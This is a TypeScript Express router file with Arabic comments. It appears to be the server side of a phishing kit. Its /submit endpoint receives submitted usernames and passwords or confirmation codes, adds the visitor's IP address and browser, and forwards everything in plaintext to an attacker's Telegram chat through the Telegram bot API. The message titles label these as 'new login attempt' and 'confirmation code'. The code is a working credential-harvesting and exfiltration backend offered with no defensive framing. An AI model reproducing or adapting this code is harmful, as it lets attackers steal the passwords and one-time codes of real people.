import "dotenv/config";
import { Router, type IRouter, Request, Response } from "express";
import healthRouter from "./health";

const router: IRouter = Router();

router.use(healthRouter);

// ============================================
// 🔐 Endpoint لإرسال التنبيهات إلى تليجرام (نفس النطاق)
// ============================================
router.post("/submit", async (req: Request, res: Response) => {
  try {
    // استقبال البيانات من الطلب
    const { username, password, timestamp, userAgent } = req.body;

    // التحقق من وجود البيانات المطلوبة
    if (!username) {
      return res.status(400).json({ error: "Username is required" });
    }

    // الحصول على التوكن ومعرف الدردشة من متغيرات البيئة
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // التحقق من إعدادات التليجرام
    if (!botToken || !chatId) {
      console.error("⚠️ Telegram credentials not configured");
      return res.status(500).json({ error: "Telegram not configured" });
    }

    // الحصول على IP المستخدم (مع مراعاة الـ Proxy)
    const ip = req.headers['x-forwarded-for'] || req.ip || 'غير معروف';

    // بناء الرسالة مع التفرقة بين النوعين
    const isCode = username === "🔐 رمز التأكيد";
    const title = isCode ? "🔐 *رمز التأكيد*" : "🔐 *محاولة دخول جديدة*";
    const label = isCode ? "📱 *رمز التأكيد:*" : "🔑 *كلمة المرور:*";

    const message = `
${title}

👤 *اسم المستخدم:* ${username}
${label} ${password}
⏱️ *الوقت:* ${timestamp || new Date().toLocaleString()}
🌐 *IP:* ${ip}
📱 *المتصفح:* ${userAgent || 'غير معروف'}
    `;

    // إرسال الرسالة إلى تليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Telegram error:", errorText);
      return res.status(500).json({ error: "Failed to send Telegram message" });
    }

    console.log("✅ Telegram notification sent for:", username);
    res.status(200).json({ success: true });

  } catch (error) {
    console.error("❌ Telegram alert error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
